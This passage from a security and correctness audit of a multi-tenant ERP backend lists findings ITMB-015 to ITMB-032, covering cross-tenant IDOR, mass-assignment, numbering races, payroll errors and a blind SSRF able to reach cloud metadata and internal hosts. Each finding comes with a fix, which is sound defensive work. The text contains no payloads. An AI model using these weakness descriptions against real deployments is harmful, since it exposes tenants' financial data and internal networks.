**Fix (summary):** Inject CompanyScopeService, thread AuthUser into findAll, and replace `if (query.companyId) where.companyId = query.companyId` with merging await this.companyScope.companyWhereFor(user, query.companyId) into where. In findOne and every id-based mutation, after fetching the record add await this.companyScope.assertCanAccessCompany(user, record.companyId) before any write or audit log. Mirror the already-scoped fuel-shifts pattern. Narrowing-only.

---

#### ITMB-015 — Fuel credit sale persists without its Receivable when A/R creation fails — bare catch swallows every error with no log and no transaction

- **Severity:** high  •  **Confidence:** high  •  **Category:** reliability/empty-catch-data-integrity
- **Location:** `backend/src/modules/fuel-credit-sales/fuel-credit-sales.service.ts:67`

**What & why:** FuelCreditSalesService.create() persists the FuelCreditSale row (lines 21-40) OUTSIDE any transaction, then in a separate try (lines 42-66) generates the receivable number, looks up customer/branch, creates the linked Receivable, and back-links it via fuelCreditSale.update({ receivableId }). The catch at lines 67-69 contains only the comment 'Receivable creation failure must not block the credit sale' — it swallows EVERY error with no logging. If receivable-number generation, the customer/branch lookup, receivable.create, or the back-link update throws (transient DB error, constraint violation, etc.), the credit sale is already committed and the method returns it as success while no Receivable exists and receivableId stays null. The sale write and the receivable write are not atomic.

**Evidence:** Lines 21-40 create the sale outside a transaction; lines 43-66 generate the receivable number, look up customer/branch, create the receivable, and update receivableId; lines 67-69: `} catch { // Receivable creation failure must not block the credit sale }` — bare catch, no logger, no $transaction.

**Impact:** A fuel credit sale (customer owes money) can be recorded with NO accounts-receivable record tracking the debt. That amount becomes invisible to A/R aging, collections, and the customer outstanding balance — silent debt/revenue leakage on a live petroleum operation. Because the catch logs nothing, there is no log line, no alert, and no flag to reconcile the orphaned sale.

**Fix (summary):** Wrap the FuelCreditSale create + Receivable create + back-link update in a single prisma.$transaction so they commit or roll back together (the entity-code-generator calls can be hoisted before the transaction). If decoupling is genuinely required for resilience, at minimum log at error level inside the catch (this.logger.error with sale.id) and leave receivableId null so a reconciliation job can find and repair sales missing their A/R. Do not swallow silently.

---

#### ITMB-016 — Fuel daily reconciliation number uses a GLOBAL count()+1 -> P2002 crash on concurrent close (@@unique([companyId, reconciliationNumber]))

- **Severity:** high  •  **Confidence:** high  •  **Category:** numbering
- **Location:** `backend/src/modules/fuel-daily-reconciliation/fuel-daily-reconciliation.service.ts:32`

**What & why:** generate() computes the number at lines 31-33: `const count = await this.prisma.fuelDailyReconciliation.count();` -- a GLOBAL count with NO where clause (cross-company AND cross-branch) -- then `RECON-${year}-${(count+1).padStart(5,'0')}`, with the row created later and no surrounding $transaction. schema.prisma:3748 enforces @@unique([companyId, reconciliationNumber]). Any two concurrent reconciliations anywhere in the system read the same global count and emit the same RECON-YYYY-NNNNN; if they share a company the loser fails P2002 (500). The findFirst dedupe at lines 20-23 only guards same (branchId, reconciliationDate), not the counter, so cross-branch/cross-company concurrency is unprotected.

**Evidence:** fuel-daily-reconciliation.service.ts:32 global count() (no where); :33 number; row created after, no $transaction; dedupe :20-23 guards only (branchId,date); unique schema.prisma:3748. No Reconciliation key in DEFAULT_PATTERNS (defaults.ts).

**Impact:** At a multi-station petroleum company the end-of-day reconciliation -- the control document tying pump readings to cash -- 500s when two stations of the same company close out concurrently, blocking audit-critical daily cash-variance reconciliation. The unscoped global count also makes the per-company sequence non-deterministic.

**Fix (summary):** Scope by company and make number+create atomic: move a companyId+year-scoped count and the create into one $transaction with a single P2002 retry, preserving the 'RECON-' prefix. Do NOT blindly use codes.next -- there is no Reconciliation/FuelDailyReconciliation key in DEFAULT_PATTERNS so fallbackPattern would change the prefix; if migrating, add a default with prefix 'RECON-{YYYY}-' first.

---

#### ITMB-017 — IDOR: Fuel Nozzle Readings findOne/update not company-scoped (list IS scoped)

- **Severity:** high  •  **Confidence:** high  •  **Category:** Broken Access Control / IDOR
- **Location:** `backend/src/modules/fuel-nozzle-readings/fuel-nozzle-readings.service.ts:55`

**What & why:** CORRECTION to the original audit: findAll (14-53) DOES scope by company via applyCompanyScopeWhere(where, user, companyId) at line 33, so the list does NOT leak across companies. However findOne(id) at 55-67 uses prisma.fuelNozzleReading.findUnique({ where: { id } }) with no company assertion and no AuthUser, and update(id, dto, userId) at 69-110 routes through that unscoped findOne then mutates by raw id. A user with nozzle-readings permission in one company can read and edit (closingMeter/litresSold/expectedAmount/status) any reading across companies by id.

**Evidence:** fuel-nozzle-readings.service.ts:33 applyCompanyScopeWhere(where, user, companyId) in findAll; :55-66 findOne findUnique({ where: { id } }) no company check, no user; :70 update calls this.findOne(id) then update({ where: { id } }).

**Impact:** Any authenticated petroleum user can read a single fuel nozzle reading of any company by id and modify its meter readings and computed expected amount/status — corrupting another company's shift reconciliation. Single-record cross-tenant IDOR; the list endpoint is correctly scoped and not affected.

**Fix (summary):** Inject CompanyScopeService and add an AuthUser parameter to findOne; after fetching call await this.companyScope.assertCanAccessCompany(user, record.companyId). Have update call findOne(id, user) so the assertion runs before mutation, and pass @CurrentUser() from the controller's findOne/update handlers. Narrowing-only.

---

#### ITMB-018 — IDOR + cross-company list leakage: Fuel Tank Dips not company-scoped (post() also mutates another company's tank + inventory)

- **Severity:** high  •  **Confidence:** high  •  **Category:** Broken Access Control / Multi-tenant isolation
- **Location:** `backend/src/modules/fuel-tank-dips/fuel-tank-dips.service.ts:25`

**What & why:** FuelTankDipsService does not inject CompanyScopeService. findAll (19-48) uses `if (query.companyId) where.companyId = query.companyId` (line 25), so omitting companyId returns all companies' tank dips. findOne(id) at 50-62 does findFirst({ where: { id, deletedAt: null } }) with no company check and no user param. update/submit/approve/reject/post/remove (122,183,207,235,269,344) all route through the unscoped findOne(id) and mutate by raw id — including post(), which adjusts tank balances and writes an inventory movement.

**Evidence:** fuel-tank-dips.service.ts:24-25 where={deletedAt:null}; if(query.companyId) where.companyId=query.companyId; :50-61 findOne findFirst({ where:{ id, deletedAt:null } }) no company/user; mutations at :123,:184,:208,:236,:270,:345 all call this.findOne(id).

**Impact:** Any authenticated petroleum user can list every company's tank dips (station physical/book volumes and variance values) by omitting companyId, and can read or drive the full lifecycle (submit/approve/reject/post/delete) of any dip across companies by id — post() further mutates another company's tank balance and creates an inventory movement. Cross-tenant leakage plus inventory integrity loss.

**Fix (summary):** Inject CompanyScopeService, thread AuthUser through findAll/findOne and the lifecycle methods. In findAll merge await this.companyScope.companyWhereFor(user, query.companyId) into where instead of the bare companyId assignment. In findOne (and therefore all mutations) add await this.companyScope.assertCanAccessCompany(user, record.companyId) after fetch; in create assert access to dto.companyId. Narrowing-only.

---

#### ITMB-019 — PAYE bands and statutory contribution rates are not effective-dated — back-dated / re-run payroll re-rates a prior period at today's rate table

- **Severity:** high  •  **Confidence:** high  •  **Category:** effective-dating
- **Location:** `backend/src/modules/hr/payroll-calculator/payroll-calculator.service.ts:36`

**What & why:** loadReferenceData(region) resolves the PAYE TIERED bracket table and every statutory contribution rate (NSSF/PSSSF/WCF/SDL/NHIF/HESLB) by `orderBy: { effectiveFrom: 'desc' }, take: 1` with NO effective-date constraint and is never given the payroll period being computed. PAYE brackets: lines 32-37; NSSF pension rate: lines 43-47; statutory rules: lines 53-57. The caller payroll-runs.service.ts:146 invokes `this.calculator.loadReferenceData(region)` with no date, even though the period is already loaded on the run (payroll-runs.service.ts:121-124, include: { period: true }). This contrasts with the date-bounded patterns used elsewhere: tax-calculator.service.ts resolveRate (lines 80-94, effectiveFrom <= asOf AND effectiveTo null/>=asOf) and tax-filing-engine.service.ts CIT (223-224) / service levy (246-247).

**Impact:** calculate() can be re-run on a DRAFT or CALCULATED run (payroll-runs.service.ts:126) and it deletes all existing PayrollEntry rows then rebuilds them (lines 151-160). When TRA changes the PAYE bands/marginal rates in a Finance Act or any statutory contribution rate is updated and a new TaxRate row is seeded, ANY recalculation or back-dated payroll for a prior month silently applies the NEW table to the OLD period. The amended prior-month PAYE/NSSF/SDL/WCF no longer matches the originally filed ITX 215.01.E / fund returns, and regenerated statutory-return CSVs disagree with what was submitted.

**Fix (summary):** Thread the run's period start/end into loadReferenceData and add to every taxRates sub-query: `effectiveFrom: { lte: periodStart }` plus `OR: [{ effectiveTo: null }, { effectiveTo: { gte: periodEnd } }]`, keeping `orderBy: { effectiveFrom: 'desc' }, take: 1`. Pass `run.period.startDate`/`endDate` (or paymentDate) from payroll-runs.service.ts:146. To stay safe on the live app, keep the existing 'newest ACTIVE' result as a fallback only when no date-bounded row exists (so currently-running payrolls do not break if historical TaxRate effective windows were never backfilled), and log when the fallback is used.

---

#### ITMB-020 — Net pay is never floored at zero — deductions exceeding gross persist a negative paycheck and corrupt the payroll accrual

- **Severity:** high  •  **Confidence:** high  •  **Category:** payroll-correctness
- **Location:** `backend/src/modules/hr/payroll-runs/payroll-runs.service.ts:367`

**What & why:** In calculate(), per-employee net pay is computed as `const netPay = grossPay - totalDeductionsEmployee;` (line 367) where `totalDeductionsEmployee = breakdown.totalEmployeeStatutory + totalManualNonStatutory + totalAdvanceRecovery` (lines 365-366). Verified there is no `Math.max(0, ...)` floor anywhere in the file (zero occurrences of Math.max). Statutory withholding, an active manual EmployeeDeduction (a fixed `amount`, summed with no cap at lines ~349-352), and a salary-advance installment are summed and subtracted unconditionally. When the three exceed gross, netPay goes negative. The negative netPay is persisted on the entry (line 381) and added into totalNetPay (line 508).

**Evidence:** payroll-runs.service.ts:365-367 `const totalDeductionsEmployee = breakdown.totalEmployeeStatutory + totalManualNonStatutory + totalAdvanceRecovery; const netPay = grossPay - totalDeductionsEmployee;`; persisted at :381 with no floor; summed at :508 `totalNetPay += netPay;`; grep confirms 0 occurrences of Math.max in the file.

**Impact:** A negative net pay is written for the employee. The accrual JE credits SALARIES_PAYABLE with sum(netPay) (payroll-postings.service.ts:218), so a negative entry nets down the company-wide payable, while the disbursement file (which references net 8 times and skips non-positive nets) drops the employee from the bank file even though their statutory liabilities are still posted and remitted. Gross is still debited in full so the JE balance check does not trip — books post but the employee is silently unpaid and withholdings are over-remitted. Real cash/withholding error in a live payroll.

**Fix (summary):** Before persisting, floor net at zero and cap discretionary deductions at available pay: compute netPay = Math.max(0, grossPay - totalEmployeeStatutory - cappedNonStatutory - cappedAdvanceRecovery), keep totalDeductions consistent (gross = net + deductions), and raise a validation error / record only the partially-withheld amount when deductions would exceed gross.

---

#### ITMB-021 — Salary advance recorded as recovered/SETTLED even when the installment was never withheld from a sufficient net pay

- **Severity:** high  •  **Confidence:** high  •  **Category:** salary-advance
- **Location:** `backend/src/modules/hr/payroll-runs/payroll-runs.service.ts:835`

**What & why:** calculate() builds an advance-recovery line equal to `installment = Math.min(installment, remaining)` (line ~356), capped only against the advance's remaining balance and never against the employee's available net pay; the full installment is pushed to advanceRecoveryLines and written as the deduction `amount`. On pay(), syncAdvanceRecoveries() sums those deduction amounts per advance (`byAdvance` from `Number(d.amount)`) and at line 835 does `const newRecovered = money(decimal(advance.recoveredAmount).plus(recoveredThisRun));`, then marks status SETTLED when `newRecovered.gte(decimal(advance.amount))` (line 836). Because net pay is not floored (companion finding), an installment can be recorded as recovered even though no/insufficient cash was actually paid to absorb it.

**Evidence:** payroll-runs.service.ts:~356 `installment = Math.min(installment, remaining); totalAdvanceRecovery += installment;` (no net-pay cap); :829-832 recovery summed from `Number(d.amount)`; :835 `const newRecovered = money(decimal(advance.recoveredAmount).plus(recoveredThisRun));` :836 `const fullyRecovered = newRecovered.gte(decimal(advance.amount));`

**Impact:** The advance receivable is reduced/settled by money never actually withheld from real cash disbursed. Advances show SETTLED while the employee still effectively owes them, under-collecting employee receivables and overstating the net-pay clearing. Repeated periods can silently write off outstanding advances.

**Fix (summary):** Cap each advance installment to the pay available after statutory and higher-priority deductions in calculate(), persist the actually-withheld amount on the deduction line as the source of truth, and in syncAdvanceRecoveries() credit recoveredAmount only by that actually-withheld amount.

---

#### ITMB-022 — Payroll period attribution differs between statutory-returns (paymentDate-first, half-open) and the tax filing engine (startDate, inclusive) — the same PAYE/NSSF lands in different months

- **Severity:** high  •  **Confidence:** high  •  **Category:** filing-period-off-by-one
- **Location:** `backend/src/modules/hr/statutory-returns/statutory-returns.service.ts:443`

**What & why:** statutory-returns.lineWhere (lines 443-464) buckets a PayrollStatutoryLine into a calendar month by paymentDate first over a half-open window [periodStart, periodEnd): `{ paymentDate: { gte: periodStart, lt: periodEnd } }` OR (paymentDate null AND startDate in window). tax-filing-engine.service.ts computePayroll (lines 200-202) buckets the SAME PayrollStatutoryLine purely by the period's startDate with an INCLUSIVE upper bound: `payrollPeriod: { startDate: { gte: base.periodStart, lte: base.periodEnd } }`. For a period earned in month M (startDate in M) but paid in M+1 (paymentDate in M+1), statutory-returns counts it in M+1 while the filing engine counts it in M; the boundary handling also differs (lt vs lte). PayrollPeriod confirms both fields exist (startDate, paymentDate?) in database/prisma/schema.prisma.

**Impact:** The operator-downloaded PAYE/NSSF/WCF/SDL/NHIF/HESLB CSV uploaded to TRA/NSSF/WCF portals (from statutory-returns) and the TaxReturn computed/persisted by the filing engine (and reported by anomaly scanner / dashboards) show DIFFERENT totals for the same calendar month whenever the pay date and the period start fall in different months — routine when salaries are paid at month-end or the following month. This produces apparent under/over-declaration and reconciliation failures between the figure filed and the figure of record.

**Fix (summary):** Adopt one canonical attribution rule and apply it identically in both places. paymentDate-first (the defensible 'remittance month', falling back to startDate when paymentDate is null) over a consistent half-open [periodStart, periodEnd) window is recommended. Update tax-filing-engine.service.ts computePayroll (200-202) to match statutory-returns.lineWhere rather than the reverse, since the CSV is what is actually submitted.

---

#### ITMB-023 — SSRF: integration connection "test" fetches a fully user-controlled URL with no private-IP / metadata blocking and follows redirects

- **Severity:** high  •  **Confidence:** high  •  **Category:** ssrf
- **Location:** `backend/src/modules/integration-connections/integration-connections.service.ts:256`

**What & why:** testConnection() (line 176) -> probeConnection() (line 248) calls `await fetch(probe.url, { method, headers, signal })` at line 256. The target URL is built in resolveProbeTarget() (lines 284-323) entirely from caller-supplied data read out of the connection's publicConfig JSON: config.testUrl/healthUrl/healthCheckUrl/baseUrl (lines 288-289) plus config.testPath/healthPath etc. (lines 290-297). publicConfig is persisted verbatim from the create/update DTO (`publicConfig: dto.publicConfig` at lines 95 and 130); the DTO only declares `@IsObject()` with no URL/host validation (create-integration-connection.dto.ts lines 50-52). The ONLY restriction before the fetch is a protocol allowlist `['http:','https:']` at line 306. There is no hostname/IP validation, so the URL can target the cloud instance-metadata endpoint (http://169.254.169.254/...), localhost/127.0.0.1 internal admin services, or RFC1918 hosts (10/8, 172.16/12, 192.168/16). fetch follows redirects by default (no redirect:'manual'), so a 30x from an allowed host to an internal one is not blocked. Attacker-controlled testHeaders (line 313) are forwarded to the internal target. The endpoint is reachable to any authenticated user holding integration_connections.test (controller line 57, @Post(':id/test')) plus integration_connections.manage to set publicConfig (controller lines 35/41). CORRECTION to the original finding: testConnection returns only the sanitized record (lines 182-203) and the audit metadata; the response-body slice computed at lines 263-265 is NOT returned to the API caller, so this is BLIND SSRF, not partial-read SSRF.

**Impact:** An authenticated user can make the live production server issue arbitrary GET/HEAD/etc. requests to internal infrastructure and the cloud metadata service. The boolean ok/error result plus the returned durationMs (timing) turns this into a reliable host/port scanner of the private network and lets the server reach internal-only services. On a cloud host the metadata endpoint can expose instance role data via downstream side effects. High severity on an internet-facing multi-tenant ERP.

**Fix (summary):** In resolveProbeTarget (and again on every redirect hop), resolve the hostname to IP(s) and reject loopback/private/link-local/reserved ranges (127/8, 10/8, 172.16/12, 192.168/16, 169.254/16, 0.0.0.0, ::1, fc00::/7) plus the metadata IP 169.254.169.254; validate the RESOLVED IP and pin the connection to it to defeat DNS rebinding. Pass redirect:'manual' to fetch and re-validate any Location target before following. Prefer an allowlist of approved provider base URLs, and do not forward arbitrary caller-supplied testHeaders to the target.

---

#### ITMB-024 — labor-records create() has no company-access check and trusts client paymentStatus + unbounded totalAmount (cross-tenant write + mass-assignment)

- **Severity:** high  •  **Confidence:** high  •  **Category:** mass-assignment/tenant-isolation
- **Location:** `backend/src/modules/labor-records/labor-records.service.ts:18`

**What & why:** create(dto, userId) reads dto.companyId straight from the body to generate a code, then writes data: { ...dto, laborRecordNumber, laborDate:..., createdById: userId } (service:18-22) with NO companyScope.assertCanAccessCompany; only userId (not the AuthUser) is passed in, so the service cannot scope. CreateLaborRecordDto exposes client-settable paymentStatus (create-labor-record.dto.ts:18) and a required totalAmount with no @Min (line 16; hoursWorked/dayRate are also unbounded). CORRECTION to the original finding: the DTO contains NO paidById/paidAt fields and NO trailing non-TypeScript/tampered text — the file (lines 1-20) is clean; only paymentStatus and the unbounded amounts apply.

**Evidence:** service:18-22 async create(dto, userId){ const laborRecordNumber = await this.codes.next({entityType:'LaborRecord', companyId: dto.companyId}); const record = await this.prisma.laborRecord.create({ data:{ ...dto, laborRecordNumber, laborDate:new Date(dto.laborDate), createdById: userId } }); }  DTO:16 @IsNumber() totalAmount!; DTO:18 @IsEnum(LaborPaymentStatus) @IsOptional() paymentStatus?. controller:18-19 passes only user.id.

**Impact:** A user can create labor-cost records against any companyId they do not have access to (cross-tenant write into another tenant's construction labour cost), pre-mark them PAID via paymentStatus, and book negative/arbitrary totalAmount, corrupting another tenant's project-cost ledger and payment status.

**Fix (summary):** Change the controller and service to pass the AuthUser and call await companyScope.assertCanAccessCompany(user, dto.companyId, AccessLevel.WRITE) at the top of create(). Remove paymentStatus from CreateLaborRecordDto (payment recorded via a dedicated endpoint) and add @Min(0) to totalAmount/hoursWorked/dayRate.

---

#### ITMB-025 — lease-agreements create() mass-assigns client createdById/approvedById (forged authorship + self-approval of a binding contract)

- **Severity:** high  •  **Confidence:** high  •  **Category:** mass-assignment
- **Location:** `backend/src/modules/lease-agreements/lease-agreements.service.ts:12`

**What & why:** CreateLeaseAgreementDto declares createdById!: string (required, client-supplied) and approvedById?: string (create-lease-agreement.dto.ts:21-22) — both are declared DTO members, so whitelist:true keeps them. create() writes data: { ...dto, startDate:..., endDate:... } (service:13-18), persisting both verbatim. A separate approve(id, userId) (service:65-69) correctly stamps approvedById/approvedAt/status='ACTIVE' from the authenticated user, proving approvedById is meant to be server-controlled; create() lets the client set it directly. createdById should be derived from @CurrentUser, not the body. (status is also @IsOptional in the DTO and spread through, allowing creation directly in ACTIVE.)

**Evidence:** DTO:21-22 @IsString() createdById!: string; @IsString() @IsOptional() approvedById?: string. service:13-18 create: data:{ ...dto, startDate:new Date(dto.startDate), ... }. service:65-69 approve: data:{ approvedById:userId, approvedAt:new Date(), status:'ACTIVE' }.

**Impact:** A user who can create a lease can set approvedById (and, via status, mark it ACTIVE) at creation, bypassing segregation-of-duties on a financially binding contract, and can forge createdById to misattribute the record, defeating audit attribution.

**Fix (summary):** Remove approvedById from CreateLeaseAgreementDto (approval only via the approve endpoint) and derive createdById = user.id in the service rather than from the body (destructure-and-omit before the prisma create). Optionally restrict status so it cannot be set to ACTIVE at creation.

---

#### ITMB-026 — loan-repayment-schedules create()/recordPayment() spread an untyped @Body() with no loan/company scoping (cross-tenant financial write + GL posting)

- **Severity:** high  •  **Confidence:** high  •  **Category:** mass-assignment/tenant-isolation
- **Location:** `backend/src/modules/loan-repayment-schedules/loan-repayment-schedules.service.ts:65`

**What & why:** The controller declares create(@Body() dto: any, ...) (loan-repayment-schedules.controller.ts:24); with no DTO metatype the global ValidationPipe (whitelist/forbidNonWhitelisted/transform, confirmed at main.ts:46-53) never runs. create() then does prisma.loanRepaymentSchedule.create({ data: { ...dto, createdById: user.id } }) (service:66-67): the entire client body is persisted verbatim including client-chosen companyId, loanDebtId, installmentNumber, principalAmount/interestAmount/totalAmount/outstandingAmount, status and dueDate. There is no parent-loan lookup, no companyScope.assertCanAccessCompany and no scoping at all. recordPayment() (service:160) loads the schedule via findOne() = findFirst({where:{id,deletedAt:null}}) (service:57-60) with no user/company filter, then posts a balanced journal entry and decrements the parent loan's outstandingBalance — against ANY company's schedule. generateForLoan() (service:85-112) loads the loan first and derives companyId, proving this is the intended pattern that create() omits.

**Evidence:** controller:24 create(@Body() dto: any, @CurrentUser() user). service:65-68 async create(dto: any, user){ const item = await this.prisma.loanRepaymentSchedule.create({ data: { ...dto, createdById: user.id } }); }  service:57-60 findFirst({ where: { id, deletedAt: null } }) (no company filter). Global ValidationPipe confirmed main.ts:46-53.

**Impact:** A user with loan_schedules.create can write a repayment-schedule row attributed to ANY company/loan with arbitrary amounts and status (e.g. mark an installment PAID). With loan_schedules.pay they can post journal entries and reduce the outstanding balance on other tenants' loans, corrupting loan liabilities and the general ledger across tenant boundaries.

**Fix (summary):** Add CreateLoanRepaymentScheduleDto and RecordRepaymentDto with class-validator decorators (@IsUUID loanDebtId, @IsInt @Min(1) installmentNumber, @IsNumber @Min(0) amounts, @IsEnum status, @IsDateString dueDate/paymentDate) and type the controller params. In create(), load the parent loan and call companyScope.assertCanAccessCompany(user, loan.companyId, WRITE), then derive companyId/loanDebtId from the loan rather than the body. In findOne()/recordPayment(), resolve the schedule's loan companyId and assertCanAccessCompany before posting.

---

#### ITMB-027 — parking-rates create() mass-assigns client createdById/approvedById (self-approval of pricing + forged authorship)

- **Severity:** high  •  **Confidence:** high  •  **Category:** mass-assignment
- **Location:** `backend/src/modules/parking-rates/parking-rates.service.ts:13`

**What & why:** CreateParkingRateDto declares createdById!: string (required, client-supplied) and approvedById?: string (create-parking-rate.dto.ts:17-18) — both are declared DTO members so whitelist:true keeps them. create() writes data: { ...dto, effectiveFrom:..., effectiveTo:... } (service:19-24), persisting them verbatim. A dedicated approve(id, userId) (service:107-118) sets status=ACTIVE/approvedById=userId/approvedAt from the authenticated user, proving approvedById/status are server-controlled; create() lets the client set them directly (status is @IsOptional in the DTO).

**Evidence:** DTO:17-18 @IsString() createdById!: string; @IsString() @IsOptional() approvedById?: string. service:19-24 create: data:{ ...dto, effectiveFrom:new Date(dto.effectiveFrom), ... }. service:107-118 approve: data:{ status:ACTIVE, approvedById:userId, approvedAt:new Date() }.

**Impact:** A user creating a parking rate can pre-set approvedById (and status) to self-approve pricing that drives parking revenue, bypassing the approval control, and can forge createdById to misattribute authorship.

**Fix (summary):** Remove approvedById from CreateParkingRateDto (approval only via the permission-gated approve endpoint sourcing the approver from @CurrentUser), derive createdById = user.id in the service, and prevent status from being set to ACTIVE at creation.

---

#### ITMB-028 — IDOR: Rent Payments / Lease Agreements / Parking Sessions / Restaurant Orders findOne + mutations not company-scoped (lists ARE scoped)

- **Severity:** high  •  **Confidence:** high  •  **Category:** Broken Access Control / IDOR
- **Location:** `backend/src/modules/parking-sessions/parking-sessions.service.ts:78`

**What & why:** These four property/hospitality services scope their LIST correctly via applyCompanyScopeWhere but leave findOne(id) unscoped and route id-based mutations through it. parking-sessions.service.ts findOne (78-93) is by id only; update/close/voidSession/remove (95,115,182,202) use it. rent-payments.service.ts findOne (74-84) by id only; remove (86) uses it; controller findOne (rent-payments.controller.ts:28-29) passes no user. lease-agreements.service.ts findOne (38-49) by id only; update/approve/terminate/remove (51,65,75,85) use it. restaurant-orders.service.ts findOne (63-75) by id only; update/complete/void/remove (77,91,104,117) use it. PermissionsGuard does no per-company check.

**Evidence:** parking-sessions.service.ts:79-92 findOne by id only, used by update:96/close:116/voidSession:183/remove:203; rent-payments.service.ts:75-83 + controller :28-29 findOne(no user); lease-agreements.service.ts:39-48 used by update/approve/terminate/remove; restaurant-orders.service.ts:64-74 used by update/complete/void/remove; all four lists use applyCompanyScopeWhere.

**Impact:** A user with the relevant module permission can read a single parking session / rent payment / lease agreement / restaurant order belonging to ANY company by id, and (where applicable) drive its state transitions (close/void/approve/terminate/complete) or soft-delete it — e.g. close() recomputes and books parking charges, approve()/terminate() flip lease status. Cross-tenant operational/financial IDOR on single records; the list endpoints are already scoped.

**Fix (summary):** Add an AuthUser parameter to each findOne and call await this.companyScope.assertCanAccessCompany(user, record.companyId) (AccessLevel.WRITE for mutations) before returning; inject CompanyScopeService where not present; thread @CurrentUser() from every controller handler (including the findOne endpoints that currently pass none) and have all id-based mutations go through the now-scoped findOne. Narrowing-only.

---

#### ITMB-029 — Product batch number via count()+1 with no transaction -> P2002 crash under concurrency (@@unique([companyId, batchNumber]))

- **Severity:** high  •  **Confidence:** high  •  **Category:** numbering
- **Location:** `backend/src/modules/product-batches/product-batches.service.ts:16`

**What & why:** generateBatchNumber() returns `BATCH-${year}-${String(count+1).padStart(5,'0')}` from a company+year-scoped prisma.productBatch.count() (lines 16-22). create() (lines 24-44) computes the number first then does a plain prisma.productBatch.create with NO $transaction. Two concurrent goods-receipts for one company read the same count and produce the same BATCH-YYYY-NNNNN; schema.prisma:4036 enforces @@unique([companyId, batchNumber]) so the loser fails P2002 (500). Batch identity drives FIFO/expiry and per-batch remainingQuantity decremented during sales issue.

**Evidence:** product-batches.service.ts:16-22 count()+1; :26 plain create, no $transaction; unique schema.prisma:4036. No ProductBatch key in DEFAULT_PATTERNS (defaults.ts:60-137) -> fallbackPattern changes prefix.

**Impact:** Concurrent batch creation 500s on the loser. For a petroleum/beverages/agriculture group, batch numbering underpins expiry tracking and recall traceability -- an inventory-accuracy and safety exposure.

**Fix (summary):** Make number+create atomic: move count+create into one $transaction with a single P2002 retry, preserving the 'BATCH-' prefix. Do NOT blindly use codes.next({entityType:'ProductBatch'}) -- there is no ProductBatch entry in DEFAULT_PATTERNS, so fallbackPattern() would derive a different prefix (e.g. 'PRODUC-...') and change the visible batch numbers. If migrating to the generator, add a ProductBatch:{prefix:'BATCH-{YYYY}-',padding:5} default first.

---

#### ITMB-030 — Proforma invoice number generated via count()+1 outside the tx -> P2002 crash under concurrency (@@unique([companyId, proformaNumber]))

- **Severity:** high  •  **Confidence:** high  •  **Category:** numbering
- **Location:** `backend/src/modules/proforma-invoices/proforma-invoices.service.ts:28`

**What & why:** generateProformaNumber() returns `PRF-${year}-${String(count+1).padStart(5,'0')}` from a company+year-scoped prisma.proformaInvoice.count() (lines 28-34), called at line 38 BEFORE the $transaction at line 40. Concurrent create() calls for one company compute the same PRF-YYYY-NNNNN; schema.prisma:4265 enforces @@unique([companyId, proformaNumber]) so the loser fails P2002 (500). Same read-modify-write race as quotations.

**Evidence:** proforma-invoices.service.ts:28-34 count()+1 (PRF-); :38 call before tx at :40; unique schema.prisma:4265. DEFAULT_PATTERNS.ProformaInvoice='PFI-{YYYY}-' defaults.ts:74 (prefix mismatch with inline PRF-).

**Impact:** Concurrent proforma creation throws a 500 on the losing request. Proforma invoices are customer-facing financial documents; count()+1 can never guarantee the unique/gapless numbering expected for TRA traceability.

**Fix (summary):** Make the read-modify-write atomic. IMPORTANT: do NOT route this through codes.next({entityType:'ProformaInvoice'}) without first fixing the default -- DEFAULT_PATTERNS.ProformaInvoice is 'PFI-{YYYY}-' (defaults.ts:74) which would silently change the customer-facing prefix from PRF to PFI on this live system. Safest fix: move count+create into one $transaction with a single P2002 retry, preserving the 'PRF-' prefix. If standardizing on the generator, first change the ProformaInvoice default prefix to 'PRF-{YYYY}-'.

---

#### ITMB-031 — project-material-issues post() bypasses the locking balance mutator: TOCTOU oversell, and a null-balance branch records a movement with no balance decrement

- **Severity:** high  •  **Confidence:** high  •  **Category:** concurrency/correctness
- **Location:** `backend/src/modules/project-material-issues/project-material-issues.service.ts:152`

**What & why:** post() consumes stock by hand inside its $transaction (lines 152-198) instead of calling inventoryMovements.createMovement, bypassing the central SELECT ... FOR UPDATE lock + negative-stock guard in inventory-movements.service.ts:225/246-252. Per line it: (a) reads the balance with a plain, non-locking tx.inventoryBalance.findFirst (lines 155-157) with no availability check, (b) creates an INTERNAL_USE inventoryMovement (lines 161-177), then (c) decrements quantityOnHand only inside `if (bal)` (lines 179-187). Two concrete bugs: (1) TOCTOU oversell - the findFirst takes no row lock and there is no availability guard, so two concurrent posts (or a post racing a sale that DOES lock) both read the same on-hand and both decrement, driving quantityOnHand negative; this path never raises insufficient-stock. (2) Ledger/balance drift - when no balance row exists (bal === null) the `if (bal)` guard at line 179 SKIPS the decrement, but the movement was already created at line 161, so the ledger records an outbound issue with zero corresponding balance change, permanently diverging InventoryBalance from sum(InventoryMovement).

**Evidence:** const bal = await tx.inventoryBalance.findFirst({ where: { productId: line.productId, branchId: sourceBranchId } }); ... await tx.inventoryMovement.create({ data: { movementType: InventoryMovementType.INTERNAL_USE, quantity: Number(line.quantity), ... } }); if (bal) { await tx.inventoryBalance.update({ where: { id: bal.id }, data: { quantityOnHand: { decrement: Number(line.quantity) }, totalValue: { decrement: lineTotalCost } } }); }  // non-locking findFirst, no availability guard, movement created even when bal is null

**Impact:** Project material issues can oversell stock to negative under concurrency (no lock, no availability guard), and when a balance row is absent the issue is recorded as a movement while on-hand is never reduced - permanently diverging stored InventoryBalance from the movement ledger.

**Fix (summary):** Inside the existing $transaction, replace the manual findFirst + conditional decrement with this.inventoryMovements.createMovement({ companyId: existing.companyId, productId: line.productId, branchId: sourceBranchId, movementType: 'INTERNAL_USE', quantity: Number(line.quantity), unitCost, referenceType: 'PROJECT_MATERIAL_ISSUE', referenceId: existing.id, tx }); that path takes the FOR UPDATE lock, enforces the negative-stock guard, and upserts the balance row when missing so a movement is never recorded without a matching balance change.

---

#### ITMB-032 — Quotation/proforma conversion writes a CONFIRMED sales order directly, bypassing inventory issue, receivable and tax-ledger posting

- **Severity:** high  •  **Confidence:** high  •  **Category:** Inventory/Pricing integrity
- **Location:** `backend/src/modules/quotations/quotations.service.ts:183`

